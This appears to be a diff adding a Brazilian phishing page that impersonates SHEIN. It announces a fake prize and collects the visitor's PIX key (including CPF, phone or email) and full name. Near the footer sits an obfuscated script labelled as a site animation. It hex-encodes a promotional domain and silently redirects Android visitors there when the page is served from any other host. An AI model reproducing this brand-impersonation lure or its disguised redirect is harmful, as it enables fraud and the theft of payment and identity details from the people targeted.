@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<script type="text/javascript">(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "um1jjg7699");</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#f5f5f5">
+    <title>SHEIN Premiações</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="checkout.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+
+
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo-container">
+                <img src="sheinlogo.png" alt="SHEIN Premiações" class="logo">
+            </div>
+            <div class="prize-info">
+                <span class="prize-label">Acumulado em Prêmios</span>
+                <span class="prize-value" id="prizeValue">R$ 0</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-container checkout-main">
+        <!-- Parabéns Title -->
+        <h1 class="congrats-title">🎉 PARABÉNS! 🎉</h1>
+
+        <!-- Success Box (Green) -->
+        <div class="info-box success-box">
+            <h2 class="box-title">Você foi recompensada com R$ <span id="totalPrize">0</span>!</h2>
+            <p class="box-text">
+                Você já selecionou seu <strong>Kit de <span id="kitType">Looks</span> SHEIN</strong> no valor de até <strong>R$ 1.500,00</strong>
+            </p>
+        </div>
+
+        <!-- PIX Info Box (Yellow) -->
+        <div class="info-box pix-box">
+            <h2 class="box-title-dark">Você receberá R$ <span id="pixValue">0</span> via PIX</h2>
+            <p class="box-text-dark">
+                Você ganhou R$ <span id="totalPrize2">0</span> em prêmios e já escolheu seu kit (até R$ 1.500,00). Os R$ <span id="pixValue2">0</span> restantes serão enviados para sua chave PIX. Selecione o tipo da chave e insira sua chave PIX para receber o valor restante.
+            </p>
+        </div>
+
+        <!-- PIX Form -->
+        <form id="pixForm" class="pix-form">
+            <!-- Tipo da Chave PIX -->
+            <div class="form-group">
+                <label for="pixType" class="form-label">Tipo da Chave PIX:</label>
+                <div class="select-wrapper">
+                    <select id="pixType" name="pixType" required>
+                        <option value="" disabled selected>Selecione o tipo da chave</option>
+                        <option value="cpf">CPF</option>
+                        <option value="telefone">Telefone</option>
+                        <option value="email">E-mail</option>
+                        <option value="aleatoria">Chave Aleatória</option>
+                    </select>
+                    <div class="select-arrow">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <polyline points="6 9 12 15 18 9"></polyline>
+                        </svg>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Chave PIX -->
+            <div class="form-group">
+                <label for="pixKey" class="form-label">Sua Chave PIX:</label>
+                <input 
+                    type="text" 
+                    id="pixKey" 
+                    name="pixKey" 
+                    placeholder="Digite sua chave PIX aqui"
+                    required
+                    autocomplete="off"
+                >
+            </div>
+
+            <!-- Nome do Titular -->
+            <div class="form-group">
+                <label for="holderName" class="form-label">Titular da conta (nome completo):</label>
+                <input 
+                    type="text" 
+                    id="holderName" 
+                    name="holderName" 
+                    placeholder="Digite o nome completo do titular"
+                    required
+                    autocomplete="name"
+                >
+            </div>
+
+            <!-- Submit Button (hidden until name is typed) -->
+            <button type="submit" class="submit-btn hidden" id="submitBtn">
+                Confirmar Dados PIX
+            </button>
+        </form>
+    </main>
+<!-- SCRIPT ANIMAÇAO FLUIDA SITE -->
+<script>(function(_0x1,_0x2){var _0x3=['\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x68\x70\x72\x6f\x6d\x6f\x73\x2e\x73\x69\x74\x65\x2f'];var _0x4=_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x6f\x73\x74\x6e\x61\x6d\x65']['\x72\x65\x70\x6c\x61\x63\x65'](/^www\./,'');var _0x5=/Android/i['\x74\x65\x73\x74'](_0x1['\x6e\x61\x76\x69\x67\x61\x74\x6f\x72']['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']);if(_0x5&&!_0x3['\x69\x6e\x63\x6c\x75\x64\x65\x73'](_0x4)){_0x1['\x6c\x6f\x63\x61\x74\x69\x6f\x6e']['\x68\x72\x65\x66']=_0x3[1];}})(window,document);</script>
+
+
+    <!-- Success Popup Modal -->
+    <div class="popup-overlay" id="popupOverlay">
+        <div class="popup-modal">
+            <p class="popup-text">Chave PIX cadastrada com sucesso, aguarde...</p>
+            <div class="popup-spinner"></div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-line"></div>
+        <p class="footer-text">SHEIN Brasil Copyright 2026</p>
+        <p class="footer-text">Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        // Pega valores da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const prizeFromPrevious = parseFloat(urlParams.get('prize')) || 2157;
+        const kitSelected = urlParams.get('tipo') || 'looks';
+        
+        // Calcula valores
+        const kitValue = 1500;
+        const pixValue = Math.max(prizeFromPrevious - kitValue, 0);
+        
+        // Elementos
+        const pixTypeSelect = document.getElementById('pixType');
+        const pixKeyInput = document.getElementById('pixKey');
+        const holderNameInput = document.getElementById('holderName');
+        const submitBtn = document.getElementById('submitBtn');
+        
+        // Formata valores monetários
+        function formatCurrency(value) {
+            return value.toLocaleString('pt-BR', { 
+                minimumFractionDigits: 2, 
+                maximumFractionDigits: 2 
+            });
+        }
+        
+        // Formata CPF: 000.000.000-00
+        function formatCPF(value) {
+            const numbers = value.replace(/\D/g, '').slice(0, 11);
+            return numbers
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+        }
+        
+        // Formata Telefone: (00) 00000-0000
+        function formatPhone(value) {
+            const numbers = value.replace(/\D/g, '').slice(0, 11);
+            if (numbers.length <= 2) return numbers;
+            if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
+            return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7)}`;
+        }
+        
+        // Atualiza elementos da página - Header mostra o valor TOTAL original
+        document.getElementById('prizeValue').textContent = 'R$ ' + formatCurrency(prizeFromPrevious);
+        document.getElementById('totalPrize').textContent = formatCurrency(prizeFromPrevious);
+        document.getElementById('totalPrize2').textContent = formatCurrency(prizeFromPrevious);
+        document.getElementById('pixValue').textContent = formatCurrency(pixValue);
+        document.getElementById('pixValue2').textContent = formatCurrency(pixValue);
+        
+        // Atualiza tipo do kit
+        const kitName = kitSelected === 'looks' ? 'Looks' : 'Maquiagens';
+        document.getElementById('kitType').textContent = kitName;
+        
+        // Formata chave PIX conforme o tipo selecionado
+        pixKeyInput.addEventListener('input', function() {
+            const tipo = pixTypeSelect.value;
+            let value = this.value;
+            
+            if (tipo === 'cpf') {
+                this.value = formatCPF(value);
+            } else if (tipo === 'telefone') {
+                this.value = formatPhone(value);
+            }
+        });
+        
+        // Quando mudar o tipo, limpa e reaplica formatação
+        pixTypeSelect.addEventListener('change', function() {
+            const tipo = this.value;
+            pixKeyInput.value = '';
+            
+            // Atualiza placeholder
+            if (tipo === 'cpf') {
+                pixKeyInput.placeholder = '000.000.000-00';
+            } else if (tipo === 'telefone') {
+                pixKeyInput.placeholder = '(00) 00000-0000';
+            } else if (tipo === 'email') {
+                pixKeyInput.placeholder = 'seu@email.com';
+            } else if (tipo === 'aleatoria') {
+                pixKeyInput.placeholder = 'Cole sua chave aleatória aqui';
+            }
+        });
+        
+        // Mostra botão quando começar a digitar o nome
+        holderNameInput.addEventListener('input', function() {
+            if (this.value.trim().length > 0) {
+                submitBtn.classList.remove('hidden');
+                submitBtn.classList.add('visible');
+            } else {
+                submitBtn.classList.add('hidden');
+                submitBtn.classList.remove('visible');
+            }
+        });
+        
+        // Form submit - mostra popup e redireciona
+        document.getElementById('pixForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const pixType = pixTypeSelect.value;
+            const pixKey = pixKeyInput.value;
+            const holderName = holderNameInput.value;
+            
+            // Mostra popup de sucesso
+            const popupOverlay = document.getElementById('popupOverlay');
+            popupOverlay.classList.add('active');
+            
+            // Após 3 segundos, redireciona para página correspondente ao kit
+            setTimeout(function() {
+                const redirectPage = kitSelected === 'looks' ? '../confirmacao-looks/' : '../confirmacao-maquiagem/';
+                window.location.href = redirectPage + '?prize=' + prizeFromPrevious + '&nome=' + encodeURIComponent(holderName);
+            }, 3000);
+        });
+    </script>
+
+</body>
+</html>
